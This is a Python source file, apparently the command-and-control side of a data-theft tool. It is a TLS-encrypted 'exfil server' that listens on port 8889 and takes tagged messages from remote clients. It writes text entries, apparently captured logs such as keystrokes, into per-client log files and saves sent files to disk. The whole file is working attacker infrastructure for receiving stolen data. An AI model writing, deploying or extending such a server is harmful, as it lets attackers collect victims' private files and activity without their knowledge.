# exfil.py
import socket
import struct
import ssl
import threading
import datetime
import os

host = '0.0.0.0'
port = 8889
LOG_DIR = 'exfil_logs'

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def decrypt(b):
    return b.decode().replace('\\n', '\n')

def recv_all_n(s, n):
    data = bytearray()

    while len(data) < n:
        packet = s.recv(n - len(data))
        if not packet:  # connection closed
            return None
        data.extend(packet)

    return bytes(data)


def receiveMessage(a, c):
    client_ip, client_port = a
    log_file = os.path.join(LOG_DIR, f"exfil_{client_ip}_{client_port}.log")

    with c:
        print(f"Connected to {a}, logging to {log_file}")

        while True:
            type_tag = c.recv(1)
            if not type_tag:
                print(f"Disconnected from {a}")
                break

            length_bytes = recv_all_n(c, 4)
            if not length_bytes:
                print(f"Disconnected from {a}")
                break

            length = struct.unpack("!I", length_bytes)[0]

            payload = recv_all_n(c, length)
            if not payload:
                print(f"Disconnected from {a}")
                break

            if type_tag == b'T':
                decrypted = decrypt(payload)

                with open(log_file, 'a') as f:
                    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    f.write(f"--- Log entry at {timestamp} ---\n")
                    f.write(decrypted)
                    f.write("\n\n")

            elif type_tag == b'F':
                decrypted = payload

                i = 0
                while os.path.exists(f"file{i}.data"):
                    i += 1
                filename = f"file{i}.data"

                with open(filename, "wb") as f:
                    f.write(decrypted)

# Create SSL context
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ssl_context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
ssl_context.check_hostname = False
ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
    raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_socket.bind((host, port))
    raw_socket.listen()
    print(f"Starting the exfil server..")
    print(f"Listening on {host}:{port} (TLS)")

    with ssl_context.wrap_socket(raw_socket, server_side=True) as s:
        while True:
            c, a = s.accept()
            threading.Thread(target=receiveMessage, args=(a, c,), daemon=True).start()